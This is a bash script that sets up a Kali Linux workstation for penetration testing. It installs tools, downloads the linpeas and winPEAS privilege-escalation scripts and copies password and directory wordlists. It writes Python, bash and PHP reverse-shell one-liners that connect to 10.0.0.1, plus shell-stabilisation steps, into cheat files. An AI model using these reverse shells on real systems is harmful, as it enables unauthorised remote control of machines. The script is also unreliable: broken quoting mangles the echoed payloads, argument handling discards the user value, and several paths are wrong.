#!/bin/bash

#help flag
echo
while [ -n "$1" ]
do
case "$1" in
-h) echo "this is the help menu" ;;
esac
shift
done

#vars
USER="${1:-kali}"

#download modules
sudo apt install stacer
sudo apt install gobuster
sudo apt install gedit


#get and create files
      #reverse shells
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" > one-liner   #python   
echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" >> one-liner #bash
echo "php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'" >> one-liner #php   #delimiters?
mv one-liner /home/$USER/Downloads

#shell stabalization
echo "python3 -c ‘ import pty; pty.spawn("/bin/bash") ’" > shell-stab
echo "if doesn’t work, use delimiter python3 -c "import pty; pty.spawn(\"/bin/bash\")"" >> shell-stab
echo "ctrl+z" >> shell-stab 
echo "stty raw -echo; fg" >> shell-stab
echo " export TERM=xterm (pretty)" >>shell-stab

mkdir /home/kali/Templates/post
wget -P /home/kali/Templates/post https://github.com/carlospolop/PEASS-ng/releases/download/20220410/linpeas.sh #linpeas
wget -P home/kali/Templates/post https://github.com/carlospolop/PEASS-ng/releases/download/20220410/winPEASx64.exe #winpeas

#pip, pip2, pip3
#reorganize files
cd /usr/share/wordlists/
cp rockyou.txt /home/$USER/Templates					#rockyou.txt
cd dirbuster
cp directory-list-2.3-medium.txt /home/$USER/Templates
cp directory-list-lowercase-2.3-medium.txt /home/$USER/Templates
 
mv /home/$USER/Templates/directory-list-2.3-medium.txt md.txt					#md.txt
mv /home/$USER/Templates/directory-list-lowercase-2.3-medium.txt lc-md.txt			#lc-md.txt

